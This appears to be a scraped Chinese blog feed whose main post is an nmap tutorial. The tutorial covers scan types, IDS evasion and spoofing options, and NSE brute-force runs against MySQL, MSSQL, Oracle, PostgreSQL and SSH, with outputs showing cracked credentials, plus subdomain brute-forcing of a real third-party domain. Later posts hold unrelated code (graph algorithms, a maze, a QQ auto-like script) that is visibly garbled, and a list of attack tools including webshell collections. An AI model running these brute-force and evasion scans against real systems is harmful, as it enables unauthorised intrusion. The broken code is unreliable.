一款强大的安全扫描器nmap：不老的神器 扫描除过某一个ip外的所有子网主机 nmap 10.130.1.1/24 -exclude 10.130.1.1 扫描除过某一个文件中的ip外的子网主机 nmap 10.130.1.1/24 -excludefile gov.txt 显示扫描的所有主机的列表 nmap -sL 10.130.1.1/24 sP ping 扫描 nmap 可以利用类似window/linux 系统下的ping方式进行扫描 nmap -sP 一般来说 我们会用这个命令去扫描内网的一个ip范围用来做内网的主机发现。 nmap -sP 10.130.1.1-255 一款强大的安全扫描器nmap：不老的神器 PING扫描不同于其它的扫描方式因为它只用于找出主机是否是存在在网络中的.它不是用来发现是否开放端口的.PING扫描需要ROOT权限如果用户没有ROOT权限,PING扫描将会使用connect()调用. sS SYN半开放扫描 nmap -sS 192.168.1.1 Tcp SYN Scan (sS) 这是一个基本的扫描方式,它被称为半开放扫描因为这种技术使得Nmap不需要通过完整的握手就能获得远程主机的信息。Nmap发送SYN包到远程主机但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势.如果Nmap命令中没有指出扫描类型,默认的就是Tcp SYN.但是它需要root/administrator权限。 sT TCP扫描 nmap -sT 192.168.1.1 不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect().Tcp connect()扫描技术只适用于找出TCP和UDP端口。 sU UDP扫描 nmap -sU 192.168.1.1 这种扫描技术用来寻找目标主机打开的UDP端口.它不需要发送任何的SYN包因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机并等待响应,如果返回ICMP不可达的错误消息说明端口是关闭的如果得到正确的适当的回应说明端口是开放的. sF FIN标志的数据包扫描 nmap -sF 110.130.1.43 一款强大的安全扫描器nmap：不老的神器 可以看出这个扫描的话 会漏扫许多~FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一).个类型的扫描都是具有差异性的,FIN扫描发送的包只包含FIN标识,NULL扫描不发送数据包上的任何字节,XMAS扫描发送FIN、PSH和URG标识的数据包. sV Version版本检测扫描 nmap -sV 192.168.1.135 本检测是用来扫描目标主机和端口上运行的软件的版本.它不同于其它的扫描技术它不是用来扫描目标主机上开放的端口不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCPSYN扫描开放了哪些端口。 一款强大的安全扫描器nmap：不老的神器 这个扫描的话速度会慢一些67.86秒扫一个IP。 O OS操作系统类型的探测 nmap -O 10.130.1.43 远程检测操作系统和软件Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的通过获取的信息你可以知道已知的漏洞。Nmap有一个名为的nmap-OS-DB数据库该数据库包含超过2600操作系统的信息。Nmap把TCP和UDP数据包发送到目标机器上然后检查结果和数据库对照。 一款强大的安全扫描器nmap：不老的神器 osscan-guess 猜测匹配操作系统 nmap -O –osscan-guess 192.168.1.134 通过Nmap准确的检测到远程操作系统是比较困难的需要使用到Nmap的猜测功能选项,–osscan-guess猜测认为最接近目标的匹配操作系统类型。 一款强大的安全扫描器nmap：不老的神器 PN No ping扫描 nmap -O -PN 192.168.1.1/24 如果远程主机有防火墙IDS和IPS系统你可以使用-PN命令来确保不ping远程主机因为有时候防火墙会组织掉ping请求.-PN命令告诉Nmap不用ping远程主机。使用-PN参数可以绕过PING命令,但是不影响主机的系统的发现。 一款强大的安全扫描器nmap：不老的神器 这个扫描整个c段局域网的话还是比较耗时的但是信息收集很详细大概耗时9分钟。 T 设置时间模板 nmap -sS -T 192.168.1.134 优化时间控制选项的功能很强大也很有效但有些用户会被迷惑。此外 往往选择合适参数的时间超过了所需优化的扫描时间。因此Nmap提供了一些简单的 方法使用6个时间模板使用时采用-T选项及数字(0 – 5) 或名称。模板名称有paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5) paranoid、sneaky模式用于IDS躲避 Polite模式降低了扫描 速度以使用更少的带宽和目标主机资源。 Normal为默认模式因此-T3 实际上是未做任何优化。 Aggressive模式假设用户具有合适及可靠的网络从而加速 扫描. nsane模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。 网段扫描格式 nmap -sP 解释CIDR 为你设置的子网掩码(/24 , /16 ,/8 等) 10.1.1.0/24 = 10.1.1.1-10.1.1.255 #c段扫描 10.1.1.0/16 = 10.1.1.1-10.1.255.255 #b段扫描 10.1.1.0/8 = 10.1.1.1-10.255.255.255 #a段扫描 从文件中读取需要扫描的IP列表 nmap -iL ip-address.txt 一款强大的安全扫描器nmap：不老的神器 路由跟踪扫描 路由器追踪功能能够帮网络管理员了解网络通行情况同时也是网络管理人员很好的辅助工具通过路由器追踪可以轻松的查处从我们电脑所在地到目标地之间所经常的网络节点并可以看到通过各个节点所花费的时间 nmap -traceroute www.baidu.com 一款强大的安全扫描器nmap：不老的神器 A OS识别,版本探测,脚本扫描和traceroute综合扫描 此选项设置包含了1-10000的端口ping扫描操作系统扫描脚本扫描路由跟踪服务探测。 nmap -A 10.130.1.43 一款强大的安全扫描器nmap：不老的神器一款强大的安全扫描器nmap：不老的神器 命令混合式扫描 命令混合扫描可以做到类似参数-A所完成的功能但又能细化到我们所需特殊要求。所以一般高手选择这个混合扫描 nmap -vv -p1-100,3306,3389 -O -traceroute 10.130.1.43 这些参数都是可以灵活调用的具体根据具体的扫描来使用各个参数。 一款强大的安全扫描器nmap：不老的神器一款强大的安全扫描器nmap：不老的神器 nmap -p1-65535 -sV -sS -T4 10.130.1.134 使SYN扫描并进行Version版本检测 使用T4(aggressive)的时间模板对目标ip的全端口进行扫描。 输出格式 扫描的结果输出到屏幕,同时会存储一份到grep-output.txt nmap -sV -p 139,445 -oG grep-output.txt 10.0.1.0/24 扫描结果输出为html nmap -sS -sV -T5 10.0.1.99 –webxml -oX - | xsltproc –output file.html nmap高级用法之脚本使用 按照脚本分类进行扫描 nmap –script 类别 nmap官方脚本文档: https://nmap.org/nsedoc/ 一款强大的安全扫描器nmap：不老的神器 左侧列出了脚本的分类点击分类 可以看到每一个分类下有很多具体的脚本供我们使用。nmap –script=类别这里的类别可以填写下面14大分类中的其中之一也可以填写分类里面的具体漏洞扫描脚本。nmap脚本分类: - auth: 负责处理鉴权证书绕开鉴权的脚本 - broadcast: 在局域网内探查更多服务开启状况如dhcp/dns/sqlserver等服务 - brute: 提供暴力破解方式针对常见的应用如http/snmp等 - default: 使用-sC或-A选项扫描时候默认的脚本提供基本脚本扫描能力 - discovery: 对网络进行更多的信息如SMB枚举、SNMP查询等 - dos: 用于进行拒绝服务攻击 - exploit: 利用已知的漏洞入侵系统 - external: 利用第三方的数据库或资源例如进行whois解析 - fuzzer: 模糊测试的脚本发送异常的包到目标机探测出潜在漏洞 - intrusive: 入侵性的脚本此类脚本可能引发对方的IDS/IPS的记录或屏蔽 - malware: 探测目标机是否感染了病毒、开启了后门等信息 - safe: 此类与intrusive相反属于安全性脚本 - version: 负责增强服务与版本扫描Version Detection功能的脚本 - vuln: 负责检查目标机是否有常见的漏洞Vulnerability如是否有MS08_067 使用具体脚本进行扫描 nmap –script 具体的脚本 www.baidu.com 常用脚本使用案例 扫描服务器的常见漏洞 nmap –script vuln 检查FTP是否开启匿名登陆 nmap –script ftp-anon PORT STATE SERVICE 21/tcp open ftp | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r–r– 1 1170 924 31 Mar 28 2001 .banner | d–x–x–x 2 root root 1024 Jan 14 2002 bin | d–x–x–x 2 root root 1024 Aug 10 1999 etc | drwxr-srwt 2 1170 924 2048 Jul 19 18:48 incoming [NSE: writeable] | d–x–x–x 2 root root 1024 Jan 14 2002 lib | drwxr-sr-x 2 1170 924 1024 Aug 5 2004 pub |_Only 6 shown. Use –script-args ftp-anon.maxlist=-1 to see all. 对MySQL进行暴破解 nmap –script=mysql-brute 3306/tcp open mysql | mysql-brute: | Accounts | root:root - Valid credentials 一款强大的安全扫描器nmap：不老的神器 可以看出已经暴力成功破解了MySQL,在368秒内进行45061次猜测平均TPS为146.5。 对MsSQL进行暴破解 nmap -p 1433 –script ms-sql-brute –script-args userdb=customuser.txt,passdb=custompass.txt | ms-sql-brute: | [192.168.100.128\\TEST] | No credentials found | Warnings: | sa: AccountLockedOut | [192.168.100.128\\PROD] | Credentials found: | webshop_reader:secret =&gt; Login Success | testuser:secret1234 =&gt; PasswordMustChange |_ lordvader:secret1234 =&gt; Login Success 对Oracle数据库进行暴破解 nmap –script oracle-brute -p 1521 –script-args oracle-brute.sid=ORCL PORT STATE SERVICE REASON 1521/tcp open oracle syn-ack | oracle-brute: | Accounts | system:powell =&gt; Account locked | haxxor:haxxor =&gt; Valid credentials | Statistics |_ Perfomed 157 guesses in 8 seconds, average tps: 19 对pgSQL的暴力破解 nmap -p 5432 –script pgsql-brute 5432/tcp open pgsql | pgsql-brute: | root: => Valid credentials |_ test:test =&gt; Valid credentials 对SSH进行暴力破解 nmap -p 22 –script ssh-brute –script-args userdb=users.lst,passdb=pass.lst –script-args ssh-brute.timeout=4s 22/ssh open ssh | ssh-brute: | Accounts | username:password | Statistics |_ Performed 32 guesses in 25 seconds. 利用DNS进行子域名暴力破解 nmap –script dns-brute www.baidu.com λ nmap –script dns-brute www.baidu.com Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-25 13:12 ? Nmap scan report for www.baidu.com (180.97.33.108) Host is up (0.018s latency). Other addresses for www.baidu.com (not scanned): 180.97.33.10 Not shown: 998 filtered ports PORT STATE SERVICE 80/tcp open http 443/tcp open https Host script results: | dns-brute: | DNS Brute-force hostnames: | admin.baidu.com - 10.26.109.19 | mx.baidu.com - 61.135.163.61 | svn.baidu.com - 10.65.211.174 | ads.baidu.com - 10.42.4.225 Nmap done: 1 IP address (1 host up) scanned in 92.64 seconds 一款强大的安全扫描器nmap：不老的神器 额(⊙⊙) 这个admin.baidu.com后面那个10.26.109.19难道真的是百度内网的管理平台地址 检查VMWare ESXESXi和服务器CVE-2009-3733中的路径遍历漏洞 nmap –script http-vmware-path-vuln -p80,443,8222,8333 | http-vmware-path-vuln: | VMWare path traversal (CVE-2009-3733): VULNERABLE | /vmware/Windows 2003/Windows 2003.vmx | /vmware/Pentest/Pentest - Linux/Linux Pentest Bravo.vmx | /vmware/Pentest/Pentest - Windows/Windows 2003.vmx | /mnt/vmware/vmware/FreeBSD 7.2/FreeBSD 7.2.vmx | /mnt/vmware/vmware/FreeBSD 8.0/FreeBSD 8.0.vmx | /mnt/vmware/vmware/FreeBSD 8.0 64-bit/FreeBSD 8.0 64-bit.vmx |_ /mnt/vmware/vmware/Slackware 13 32-bit/Slackware 13 32-bit.vmx 查询VMware服务器vCenterESXESXiSOAP API以提取版本信息。 λ nmap –script vmware-version -p443 10.0.1.4 Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-25 12:26 ?D1ú±ê×?ê±?? Nmap scan report for 10.0.1.4 Host is up (0.0019s latency). PORT STATE SERVICE 443/tcp open https | vmware-version: | Server version: VMware ESXi 6.5.0 | Build: 4887370 | Locale version: INTL 000 | OS type: vmnix-x86 |_ Product Line ID: embeddedEsx Service Info: CPE: cpe:/o:vmware:ESXi:6.5.0 Nmap done: 1 IP address (1 host up) scanned in 6.28 seconds 一款强大的安全扫描器nmap：不老的神器 参数详解 Nmap支持主机名,ip,网段的表示方式例如:blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-254 -iL filename 从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段 -iR hostnum 随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描 –exclude host1[, host2] 从扫描任务中需要排除的主机 –exculdefile exclude_file 排除文件中的IP,格式和-iL指定扫描文件的格式相同 主机发现 -sL 仅仅是显示,扫描的IP数目,不会进行任何扫描 -sn ping扫描,即主机发现 -Pn 不检测主机存活 -PS/PA/PU/PY[portlist] TCP SYN Ping/TCP ACK Ping/UDP Ping发现 -PE/PP/PM 使用ICMP echo, timestamp and netmask 请求包发现主机 -PO[prococol list] 使用IP协议包探测对方主机是否开启 -n/-R 不对IP进行域名反向解析/为所有的IP都进行域名的反响解析 扫描技巧 -sS/sT/sA/sW/sM TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描 -sU UDP扫描 -sN/sF/sX TCP NullFINand Xmas扫描 –scanflags 自定义TCP包中的flags -sI zombie host[:probeport] Idlescan -sY/sZ SCTP INIT/COOKIE-ECHO 扫描 -sO 使用IP protocol 扫描确定目标机支持的协议类型 -b “FTP relay host” 使用FTP bounce scan 指定端口和扫描顺序 -p 特定的端口 -p80,443 或者 -p1-65535 -p U:PORT 扫描udp的某个端口, -p U:53 -F 快速扫描模式,比默认的扫描端口还少 -r 不随机扫描端口,默认是随机扫描的 –top-ports “number” 扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个 –port-ratio “ratio” 扫描指定频率以上的端口 服务版本识别 -sV 开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测 –version-intensity “level” 设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高服务越有可能被正确识别。默认是7 –version-light 打开轻量级模式,为–version-intensity 2的别名 –version-all 尝试所有探测,为–version-intensity 9的别名 –version-trace 显示出详细的版本侦测过程信息 脚本扫描 -sC 根据端口识别的服务,调用默认脚本 –script=”Lua scripts” 调用的脚本名 –script-args=n1=v1,[n2=v2] 调用的脚本传递的参数 –script-args-file=filename 使用文本传递参数 –script-trace 显示所有发送和接收到的数据 –script-updatedb 更新脚本的数据库 –script-help=”Lua script” 显示指定脚本的帮助 OS识别 -O 启用操作系统检测,-A来同时启用操作系统检测和版本检测 –osscan-limit 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口) –osscan-guess 推测操作系统检测结果,当Nmap无法确定所检测的操作系统时会尽可能地提供最相近的匹配Nmap默认进行这种匹配 防火墙/IDS躲避和哄骗 -f; –mtu value 指定使用分片、指定数据包的MTU. -D decoy1,decoy2,ME 使用诱饵隐蔽扫描 -S IP-ADDRESS 源地址欺骗 -e interface 使用指定的接口 -g/ –source-port PROTNUM 使用指定源端口 –proxies url1,[url2],… 使用HTTP或者SOCKS4的代理 –data-length NUM 填充随机数据让数据包长度达到NUM –ip-options OPTIONS 使用指定的IP选项来发送数据包 –ttl VALUE 设置IP time-to-live域 –spoof-mac ADDR/PREFIX/VEBDOR MAC地址伪装 –badsum 使用错误的checksum来发送数据包 Nmap 输出 -oN 将标准输出直接写入指定的文件 -oX 输出xml文件 -oS 将所有的输出都改为大写 -oG 输出便于通过bash或者perl处理的格式,非xml -oA BASENAME 可将扫描结果以标准格式、XML格式和Grep格式一次性输出 -v 提高输出信息的详细度 -d level 设置debug级别,最高是9 –reason 显示端口处于带确认状态的原因 –open 只输出端口状态为open的端口 –packet-trace 显示所有发送或者接收到的数据包 –iflist 显示路由信息和接口,便于调试 –log-errors 把日志等级为errors/warings的日志输出 –append-output 追加到指定的文件 –resume FILENAME 恢复已停止的扫描 –stylesheet PATH/URL 设置XSL样式表转换XML输出 –webxml 从namp.org得到XML的样式 –no-sytlesheet 忽略XML声明的XSL样式表 其他nmap选项 -6 开启IPv6 -A OS识别,版本探测,脚本扫描和traceroute –datedir DIRNAME 说明用户Nmap数据文件位置 –send-eth / –send-ip 使用原以太网帧发送/在原IP层发送 –privileged 假定用户具有全部权限 –unprovoleged 假定用户不具有全部权限,创建原始套接字需要root权限 -V 打印版本信息 -h 输出帮助","categories":[{"name":"人生杂谈","slug":"人生杂谈","permalink":"https://hexo.imagemlt.xyz/categories/人生杂谈/"}],"tags":[]},{"title":"python实现图算法","slug":"pygraphalgorithm","date":"2017-06-12T09:09:20.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/pygraphalgorithm/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/pygraphalgorithm/index.html","excerpt":"","text":"本文为图算法的python实现。github #!/usr/bin/env python #coding=utf-8 def getWeight(V,E,u,v): if E.has_key(u): for i in E[u]: if i[1] is v: return i[2] return 100000 def BFS(V,E,start): color=[-1]len(V) depth=[0]len(V) queue=[] queue.append(start) color[start]=0 while len(queue)&gt;0: p=queue.pop(0) print “ “*depth[p], print V[p] if E.has_key(V[p]): for j in E[V[p]]: if color[V.index(j[1])]==-1: queue.append(V.index(j[1])) depth[V.index(j[1])]=depth[p]+1 color[V.index(j[1])]=0 color[p]=1 return depth time=0 def DFS_start(V,E): global time color=[-1]len(V) startTime=[0]len(V) finishTime=[0]*len(V) for i in V: if color[V.index(i)]==-1: DFS(V,E,color,startTime,finishTime,i) return startTime,finishTime def DFS(V,E,color,startTime,finishTime,i): global time time=time+1 startTime[V.index(i)]=time print “ “*startTime[V.index(i)], print i color[V.index(i)]=0 if E.has_key(i): for m in E[i]: if color[V.index(m[1])]==-1: DFS(V,E,color,startTime,finishTime,m[1]) color[i]=1 time=time+1 finishTime[V.index(i)]=time def TopologicalSort(V,E): indegree=[0]*len(V) visited=[] for i in E: for j in E[i]: indegree[V.index(j[1])]=indegree[V.index(j[1])]+1 while 0 in indegree: pos=indegree.index(0) visited.append(V[pos]) if E.has_key(V[pos]): for j in E[V[pos]]: indegree[j[1]]=indegree[j[1]]-1 indegree[pos]=-1 if len(visited)0: current=Queue.pop(0) flag=False if E.has_key(V[current]): for i in E[V[current]]: if color[V.index(i[1])] is not 1: flag=True if color[V.index(i[1])] is not -1: Queue.append(V.index(i[1])) color[V.index(i[1])]=-1 break if not flag: visited.insert(0,V[current]) color[current]=1 else: Queue.append(V[current]) color[current]=-1 return visited def Kruskal(V,E): visited=[] visitedpoints=[] notvisited=[] for m in E: for n in E[m]: notvisited.append(n) while len(visited)0: temp=(0,0,65535) for j in notvisited: if j[2]0: temp=(0,0,65535) for j in notvisited: flag=False if len(visited)==0: flag=True n=visitedpoints.count(j[0])+visitedpoints.count(j[1]) if n==1: flag=True if j[2]0: if E.has_key(int(m)): E[int(m)].append((int(m),int(n),int(s))) else: E[int(m)]=[] E[int(m)].append((int(m),int(n),int(s))) b=raw_input() print “\\nthe graph you inputed is:” print V print E print “\\nBellman_Ford:” path,length=Bellman_Ford(V,E,0) for i in range(0,len(V)): p=[] t=i print str(t)+”:”, while t is not 0: p.append(V[t]) t=path[t] print 0, while len(p)&gt;0: print p.pop(), print “\\t”+str(length[i]) print “\\nFloyd:” print Floyd(V,E) print “\\nBFS:” BFS(V,E,0) print “\\nDFS:” firstTime,lastTime=DFS_start(V,E) for i in range(0,len(V)): print “%d,%4d,%4d”%(V[i],firstTime[i],lastTime[i]) print “ToplogicalSort:” ans=TopologicalSort(V,E) print ans if len(ans)&gt;0: print “TopologicalSort:dfs” print TopologicalSort_dfs(V,E) print &quot;\\\\nPrim:&quot; print Prim(V,E) print &quot;\\\\nKruskal:&quot; print Kruskal(V,E) if __name__==”__main__“:main()","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/categories/技术学习/"}],"tags":[]},{"title":"html简易可拖动元素实现","slug":"html-simple-draggable","date":"2017-06-12T02:52:00.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/html-simple-draggable/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/html-simple-draggable/index.html","excerpt":"","text":"html{ width:100%; height:100%; } body{ width:70%; height:100%; margin:0 auto; border:2px solid #000; } .dialogue{ position:fixed; width:80px; height:80px; background-color:aqua; top:50%; left:48%; border-radius:10px; text-align:left; } .head{ display:inline-block; border:5px solid antiquewhite; height:20px; width:67%; font-size:15px; line-height:20px; margin:0 0; background-color:azure; border-radius:5px 0 0 0; -moz-user-select:none; -webkit-user-select:none; } input{ display:inline-block; width:20%;float:right; text-align:left; height:30px; border:0px; line-height:30px; background-color:antiquewhite; border-radius:0 5px 0 0; }无标题文档 xinxi: var posx_begin,posy_begin; var start=false; document.getElementById(“head”).addEventListener(“mousedown”,function(event){ posx_begin=event.offsetX; posy_begin=event.offsetY; start=true; }); document.getElementById(“head”).addEventListener(“mousemove”,function(event){ if(start){ document.getElementById(“dia”).style.top=event.offsetY-posy_begin+parseInt(window.getComputedStyle(document.getElementById(“dia”))[‘top’].slice(0,-2))+”px”; document.getElementById(“dia”).style.left=event.offsetX-posx_begin+parseInt(window.getComputedStyle(document.getElementById(“dia”))[‘left’].slice(0,-2))+”px”; } }); document.getElementById(“head”).onmouseup=document.getElementById(“head”).onmouseout=function(event){ if(start){ start=false; } }","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/categories/技术学习/"}],"tags":[]},{"title":"qq空间自动点赞脚本","slug":"qzoneclick","date":"2017-04-18T11:01:16.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/qzoneclick/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/qzoneclick/index.html","excerpt":"","text":"var s=0;function per(){ jQuery(“body,html”).animate({“scrollTop”:s}); jQuery(“.qz_like_btn_v3”).each(function(){ if(jQuery(this).attr(“data-clicklog”)==”like”) jQuery(this).click(); }); s=s+1000; setTimeout(“per()”,1000);}per();","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/categories/技术学习/"}],"tags":[]},{"title":"Cmaze","slug":"cmaze","date":"2017-04-09T08:42:55.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/cmaze/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/cmaze/index.html","excerpt":"","text":"// ConsoleApplication12.cpp : 定义控制台应用程序的入口点。// #include “stdafx.h” #include #include #include #include #include #include #define MAXSIZE 5000using namespace std; struct point { int x; int y; point(int x0 = 0, int y0 = 0):x(x0),y(y0) {} point(point&amp; p) { this-&gt;x = p.x; this-&gt;y = p.y; } bool operator==(point&amp; p){ return this-&gt;x == p.x&amp;&amp;this-&gt;y == p.y; } bool operator!=(point&amp; p) { return !(this == p); }};int direction[8][2] = { { 1,1 },{ 1,-1 },{ -1,1 },{ -1,-1 } ,{1,0},{0,1},{-1,0},{0,-1}};struct stkpoint { point p; int dir; stkpoint(point poi = NULL) :p(poi), dir(0) {}; bool operator==(stkpoint&amp;q){ return (this-&gt;p) == (q.p); }};templateclass pointStack { T vendor; int top;public: pointStack() { vendor = new T[MAXSIZE]; top = -1; } void push(T p) { vendor[++top] = p; } T pop() { if (top == -1) { cout &lt;&lt; “empty”; exit(0); } return vendor[top–]; } point operator[](int index) { return T[index]; } bool IsIn(T q) { for (int i = 0; i &lt;= top; i++) { if (vendor[i] == q) { return true; } } return false; } int getTop() { return top; }};class puzzle { int** puz; //pointStack path; int length;protected: void opendoor(int x1, int y1, int x2, int y2) { if (puz[length - 1][length - 1] == 1)puz[length - 1][length - 1] = 0; if (x1 == x2) { int pos = y1 + rand() % ((y2 - y1) / 2 + 1) 2; if (pos &gt;= length)pos–; puz[x1][pos] = 0; } else if (y1 == y2) { int pos = x1 + rand() % ((x2 - x1) / 2 + 1) 2; if (pos &gt;= length)pos–; puz[pos][y1] = 0; } else { cout &lt;&lt; “error!” &lt;&lt; endl; exit(0); } //cout &lt;&lt; “opened” &lt;&lt; endl; } void formpuzzle(int x, int y, int height, int width, bool ans) { if (ans) { print(2); system(“cls”); } int xpos, ypos; if (height &lt;= 2 || width &lt;= 2) { //cout &lt;&lt; “finished one step” &lt;&lt; endl; return; } xpos = x + rand() % ((height) / 2) 2 + 1; for (int i = y; i &lt; y + width; i++) { puz[xpos][i] = 1; } ypos = y + rand() % ((width) / 2) * 2 + 1; for (int i = x; i &lt; x + height; i++) { puz[i][ypos] = true; } int isClosed = rand() % 4 + 1; switch (isClosed) { case 1: opendoor(xpos + 1, ypos, x + height - 1, ypos);// 2 opendoor(xpos, ypos + 1, xpos, y + width - 1);// 3 opendoor(x, ypos, xpos - 1, ypos);// 4 break; case 2: opendoor(xpos, ypos + 1, xpos, y + width - 1);// 3 opendoor(x, ypos, xpos - 1, ypos);// 4 opendoor(xpos, y, xpos, ypos - 1);// 1 break; case 3: opendoor(x, ypos, xpos - 1, ypos);// 4 opendoor(xpos, y, xpos, ypos - 1);// 1 opendoor(xpos + 1, ypos, x + height - 1, ypos);// 2 break; case 4: opendoor(xpos, y, xpos, ypos - 1);// 1 opendoor(xpos + 1, ypos, x + height - 1, ypos);// 2 opendoor(xpos, ypos + 1, xpos, y + width - 1);// 3 break; default: break; } // 左上角 formpuzzle(x, y, xpos - x, ypos - y, ans); // 右上角 formpuzzle(x, ypos + 1, xpos - x, width - ypos + y - 1, ans); // 左下角 formpuzzle(xpos + 1, y, height - xpos + x - 1, ypos - y, ans); // 右下角 formpuzzle(xpos + 1, ypos + 1, height - xpos + x - 1, width - ypos + y - 1, ans); } bool go(int x, int y, bool ans) {//递归算法 if (ans) { print(); system(&quot;cls&quot;); }; if (puz\\[x\\]\\[y\\] != 0)return false; point *p = new point(x, y); //if (!path.IsIn(\\*p))path.push(\\*p); puz\\[x\\]\\[y\\] = 2; if (x == length - 1 &amp;&amp; y == length - 1) { return true; } if (x &lt; length - 1) if (puz\\[x+1\\]\\[y\\]!=2 &amp;&amp; go(x + 1, y, ans)) return true; if (y &lt; length - 1) if (puz\\[x\\]\\[y+1\\]!=2 &amp;&amp; go(x, y + 1, ans)) return true; if (x &gt; 0) if (puz\\[x-1\\]\\[y\\]!=2 &amp;&amp; go(x - 1, y, ans)) return true; if (y &gt; 0) if (puz\\[x\\]\\[y-1\\]!=2 &amp;&amp; go(x, y - 1, ans)) return true; //path.pop(); puz\\[x\\]\\[y\\] = 3; return false; } public: puzzle(int n):length(n) { puz = new int*[n]; for (int i = 0; i &lt; n; i++) { puz[i] = new int[n] {0}; } } void print(int time=0) { for (int i = 0; i &lt; length + 2; i++) { for (int j = 0; j &lt; length + 2; j++) { if (i == 0 || j == 0 || i == length + 1 || j == length + 1) { setfillcolor(BROWN); fillrectangle(10 * i, 10 * j, 10 * (i + 1), 10 * (j + 1)); } else { if (puz\\[i - 1\\]\\[j - 1\\] == 1) { setfillcolor(RED); fillrectangle(10 * i, 10 * j, 10 * (i + 1), 10 * (j + 1)); } else if (puz\\[i - 1\\]\\[j - 1\\] == 2) { setfillcolor(YELLOW); fillcircle(10 * i+5, 10 * j+5, 5); } else if (puz\\[i - 1\\]\\[j - 1\\] == 3) { setfillcolor(BLUE); fillrectangle(10 * i, 10 * j, 10 * (i + 1), 10 * (j + 1)); } else { setfillcolor(GREEN); fillrectangle(10 * i, 10 * j, 10 * (i + 1), 10 * (j + 1)); } } } cout &lt;&lt; endl; } } void mk(bool ans=1) { formpuzzle(0, 0, length, length, ans); } void go_loop() {//非递归算法 pointStack s; stkpoint w; w.p = new point(0, 0); point *q; while (true) { bool poped = false; if (puz\\[w.p-&gt;x\\]\\[w.p-&gt;y\\] ==0) { puz\\[w.p-&gt;x\\]\\[w.p-&gt;y\\] = 2; //print(); s.push(w); } else { poped = true; w = s.pop(); w.dir++; } if (w.p-&gt;x == length - 1 &amp;&amp; w.p-&gt;y == length - 1)break; if (w.dir &lt; 8) { if (poped)s.push(w); if (w.p-&gt;x + direction\\[w.dir\\]\\[0\\] &lt; length&amp;&amp;w.p-&gt;x + direction\\[w.dir\\]\\[0\\] &gt;= 0 &amp;&amp; w.p-&gt;y + direction\\[w.dir\\]\\[1\\] &lt; length&amp;&amp;w.p-&gt;y + direction\\[w.dir\\]\\[1\\] &gt;= 0) { q = new point(w.p-&gt;x + direction\\[w.dir\\]\\[0\\], w.p-&gt;y + direction\\[w.dir\\]\\[1\\]); w.p = q; w.dir = 0; } } else { puz\\[w.p-&gt;x\\]\\[w.p-&gt;y\\] = 3; if (!poped)s.pop(); } } } void search(bool ans=1) { go(0, 0, ans); } };int main() { int n,ans1,ans2; cout &lt;&lt; “请输入你需要的地图维度：”; cin &gt;&gt; n; cout &lt;&lt; “是否需要输出创建过程？”; cin &gt;&gt; ans1; cout &lt;&lt; “是否需要输出寻迹过程？”; cin &gt;&gt; ans2; srand(time(0)); int t = 2 n + 1; initgraph(10 (t+2), 10 * (t+2)); puzzle puzz(t); setfillcolor(YELLOW); setbkcolor(BLUE); puzz.print(1); puzz.mk(ans1); puzz.print(1); if (!ans1)Sleep(1000); //puzz.search(ans2); puzz.go_loop(); puzz.print(); getchar(); getchar(); return 0;}","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/categories/技术学习/"}],"tags":[]},{"title":"漏洞练习平台总结","slug":"ctf-tools","date":"2017-03-08T13:35:07.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/ctf-tools/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/ctf-tools/index.html","excerpt":"","text":"漏洞及渗透练习平台： WebGoat漏洞练习环境 https://github.com/WebGoat/WebGoat https://github.com/WebGoat/WebGoat-Legacy Damn Vulnerable Web Application(漏洞练习平台) https://github.com/RandomStorm/DVWA 数据库注入练习平台 https://github.com/Audi-1/sqli-labs 用node编写的漏洞练习平台，like OWASP Node Goat https://github.com/cr0hn/vulnerable-node 花式扫描器 ： 端口扫描器Nmap https://github.com/nmap/nmap 本地网络扫描器 https://github.com/SkyLined/LocalNetworkScanner 子域名扫描器 https://github.com/lijiejie/subDomainsBrute 漏洞路由扫描器 https://github.com/jh00nbr/Routerhunter-2.0 迷你批量信息泄漏扫描脚本 https://github.com/lijiejie/BBScan Waf类型检测工具 https://github.com/EnableSecurity/wafw00f 信息搜集工具 : 社工插件，可查找以email、phone、username的注册的所有网站账号信息 https://github.com/n0tr00t/Sreg Github信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息 https://github.com/sea-god/gitscan github Repo信息搜集工具 https://github.com/metac0rtex/GitHarvester WEB： webshell大合集 https://github.com/tennc/webshell 渗透以及web攻击脚本 https://github.com/brianwrf/hackUtils web渗透小工具大合集 